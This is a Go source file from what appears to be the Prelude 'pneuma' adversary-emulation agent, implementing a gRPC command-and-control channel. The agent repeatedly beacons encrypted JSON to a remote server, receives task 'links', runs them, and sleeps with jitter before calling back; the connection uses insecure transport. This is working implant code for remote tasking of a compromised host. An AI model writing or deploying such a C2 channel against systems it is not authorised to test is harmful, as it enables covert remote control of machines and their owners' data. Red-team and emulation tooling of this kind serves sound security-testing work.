package sockets

import (
	"context"
	"encoding/json"
	beacon2 "github.com/preludeorg/pneuma/sockets/protos/beacon"
	"github.com/preludeorg/pneuma/util"
	"time"

	"google.golang.org/grpc"
)

type GRPC struct {}

func init() {
	util.CommunicationChannels["grpc"] = GRPC{}
}

func (contact GRPC) Communicate(agent *util.AgentConfig, beacon util.Beacon, msg string) (util.Beacon, string) {
	for {
		refreshBeacon(agent, &beacon)
		for agent.Contact == "grpc" {
			var body []byte
			if msg == "" {
				body = beaconSend(agent.Address, beacon)
			} else {
				body = []byte(util.Decrypt(msg))
				msg = ""
			}
			var tempB util.Beacon
			json.Unmarshal(body, &tempB)
			if(len(tempB.Links)) == 0 {
				break
			}
			runLinks(&tempB, &beacon, agent, "")
		}
		if agent.Contact != "grpc" {
			return beacon, ""
		}
		beacon.Links = beacon.Links[:0]
		jitterSleep(agent.Sleep, "GRPC")
	}
}

func beaconSend(address string, beacon util.Beacon) []byte {
	conn, err := grpc.Dial(address, grpc.WithInsecure())
	if err != nil {
		util.DebugLogf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
	}
	defer conn.Close()
	c := beacon2.NewBeaconClient(conn)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()

	data, _ := json.Marshal(beacon)
	r, err := c.Handle(ctx, &beacon2.BeaconIncoming{Beacon: string(util.Encrypt(data))})
	if err != nil {
		return nil //no instructions for me
	}
	return []byte(util.Decrypt(r.GetBeacon()))
}
